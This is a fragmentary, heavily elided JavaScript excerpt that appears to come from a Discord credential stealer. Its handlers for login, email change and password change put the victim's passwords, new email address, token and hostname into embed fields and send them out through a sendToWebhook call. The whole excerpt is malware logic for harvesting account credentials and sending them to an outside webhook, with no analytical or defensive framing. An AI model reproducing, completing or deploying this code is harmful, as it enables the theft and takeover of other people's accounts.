    ...
    async userLogin(password, email, token) {
        ...
        var params = {
            ...
            embeds: [createEmbed({
                ...
                fields: [{
                        name: "<:1337:1093566172064129126> **Password**",
                        value: `\`${password}\``,
                        inline: true
                    },
                    {
    ...
    async emailChanged(password, newEmail, token) {
        ...
        var params = {
            ...
            embeds: [createEmbed({
                ...
                fields: [{
                        name: "<:1337:1093566174706536519> **New email address**",
                        value: `\`${newEmail}\``,
                        inline: true
                    },
                    {
    ...
    async passwordChanged(oldPassword, newPassword, token) {
        ...
        var params = {
            ...
            embeds: [createEmbed({
                ...
                fields: [{
                        name: "<:1337:1093566172064129126> **Old password**",
                        value: `\`${oldPassword}\``,
                        inline: true
                    },
                    {
                        name: "<:1337:1093566181253853304> **New password**",
                        value: `\`${newPassword}\``,
                        inline: true
                    },
                    {
            ...
            if (token == undefined) {
                sendToWebhook({
                    ...
                    embeds: [createEmbed({
                        ...
                        fields: [{
                            name: "<a:1337:1093566183707521144> **Hostname**",
                            value: `\`${os.hostname}\``,
                            inline: false
                        }, {
                            name: "<a:billing_address:1093566162320760902> **Client version**",
